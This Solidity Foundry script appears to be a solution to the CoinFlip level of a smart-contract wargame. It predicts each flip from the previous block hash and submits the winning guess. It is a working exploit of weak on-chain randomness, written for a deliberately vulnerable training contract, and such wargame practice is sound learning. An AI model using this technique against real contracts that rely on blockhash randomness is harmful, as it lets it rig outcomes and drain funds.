// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "@contracts/Level03.sol";
import "openzeppelin/contracts/math/SafeMath.sol";

contract Level3Script is Script {
    using SafeMath for uint256;

    CoinFlip level3 = CoinFlip(0xfEBce729BfCC000229c3D7D48Eb509224714d52a);
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function run() external {
        vm.startBroadcast();
        console.log("sender: ", msg.sender);

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool guess = coinFlip == 1 ? true : false;
        if (guess) {
            level3.flip(true);
        } else {
            level3.flip(false);
        }

        console.log("consecutiveWins: ", level3.consecutiveWins());
        vm.stopBroadcast();
    }
}
